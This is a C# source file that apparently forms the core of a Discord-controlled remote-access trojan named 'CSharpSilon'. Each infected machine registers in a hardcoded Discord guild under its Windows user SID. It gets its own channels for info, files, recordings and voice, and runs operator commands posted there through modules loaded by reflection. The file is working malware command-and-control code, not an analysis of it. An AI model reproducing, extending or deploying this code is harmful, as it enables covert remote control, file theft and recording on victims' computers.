using System;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting.Contexts;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;

namespace CSharpSilon
{
    public class Bot
    {
        private readonly DiscordSocketClient _client;
        private readonly CommandService _commands;
        private readonly IServiceProvider _services;
        
        

        public static readonly ulong _guildId = 1282673114324664433;
        public static readonly string _userSid = WindowsIdentity.GetCurrent().User.Value;
        public static string Prefix = Config.Prefix;

        public Bot()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Info,
                AlwaysDownloadUsers = true,
                GatewayIntents = GatewayIntents.All
            });
            
            _commands = new CommandService();
            
            var serviceCollection = new ServiceCollection();
            serviceCollection.AddSingleton(_client);
            serviceCollection.AddSingleton(_commands);

            _services = serviceCollection.BuildServiceProvider();
        }

        public async Task RunAsync()
        {
            _client.Ready += OnReady;
            _client.MessageReceived += HandleCommandAsync;

            await RegisterCommandsAsync();

            await _client.LoginAsync(TokenType.Bot, Config.Token);
            await _client.StartAsync();
            


            // Block the program until it is closed
            await Task.Delay(-1);
        }


        public static SocketGuildChannel _info;
        public static SocketGuildChannel _main;
        public static SocketGuildChannel _spam;
        public static SocketGuildChannel _file;
        public static SocketGuildChannel _recordings;
        public static SocketGuildChannel _voice;
        private async Task Setup()
        {
            // Fetch the guild by ID
            var guild = _client.GetGuild(_guildId);
        
            if (guild == null)
            {
                Console.WriteLine("Guild not found.");
                return;
            }

            // List all categories in the guild
            var categories = guild.Channels
                .Where(c => c is ICategoryChannel)
                .Cast<ICategoryChannel>();

            var category = categories.FirstOrDefault(c => c.Name == _userSid);

            if (category == null)
            {
                category = await guild.CreateCategoryChannelAsync(_userSid);

                await guild.CreateTextChannelAsync("info", properties => properties.CategoryId = category.Id);
                await guild.CreateTextChannelAsync("main", properties => properties.CategoryId = category.Id);
                await guild.CreateTextChannelAsync("spam", properties => properties.CategoryId = category.Id);
                await guild.CreateTextChannelAsync("file", properties => properties.CategoryId = category.Id);
                await guild.CreateTextChannelAsync("recordings", properties => properties.CategoryId = category.Id);

                await guild.CreateVoiceChannelAsync("voice", properties => properties.CategoryId = category.Id);
            }
            Thread.Sleep(500);
            foreach (var ch in guild.CategoryChannels)
            {
                if (ch == category)
                {
                    foreach (var c in ch.Channels)
                    {
                        if (c.Name == "info" && c.GetChannelType() == ChannelType.Text) _info = c;
                        if (c.Name == "main" && c.GetChannelType() == ChannelType.Text) _main = c;
                        if (c.Name == "spam" && c.GetChannelType() == ChannelType.Text) _spam = c;
                        if (c.Name == "file" && c.GetChannelType() == ChannelType.Text) _file = c;
                        if (c.Name == "recordings" && c.GetChannelType() == ChannelType.Text) _recordings = c;
                        if (c.Name == "voice" && c.GetChannelType() == ChannelType.Text) _voice = c;
                    }
                }
            }
        }
        

        private Task OnReady()
        {
            Console.WriteLine($"{_client.CurrentUser.Username} is online!");
            Setup();
            return Task.CompletedTask;
        }

        private async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            var context = new SocketCommandContext(_client, message);

            if (message.Author.IsBot) return;
            var categories = context.Guild.Channels
                .Where(c => c is ICategoryChannel)
                .Cast<ICategoryChannel>();
            
            
            var category = categories.Where(c => c.Name == _userSid).Cast<SocketCategoryChannel>().FirstOrDefault();
            if (!Utils.Discord.IsChannelInCategory(message.Channel, category))
            {
                return;
            }
            int argPos = 0;
            if (message.HasStringPrefix(Prefix, ref argPos))
            {
                var result = await _commands.ExecuteAsync(context, argPos, _services);
                if (!result.IsSuccess) 
                    await context.Channel.SendMessageAsync(result.ErrorReason);
            }
        }

        private async Task RegisterCommandsAsync()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var commandModuleTypes = assembly.GetTypes()
                .Where(t => t.Namespace == "CSharpSilon.cmds"
                            && typeof(ModuleBase<SocketCommandContext>).IsAssignableFrom(t)
                            && t.IsClass
                            && !t.IsAbstract
                            && !t.IsSealed);
            foreach (var type in commandModuleTypes)
            {
                await _commands.AddModuleAsync(type, _services);
            }
        }
    }
}
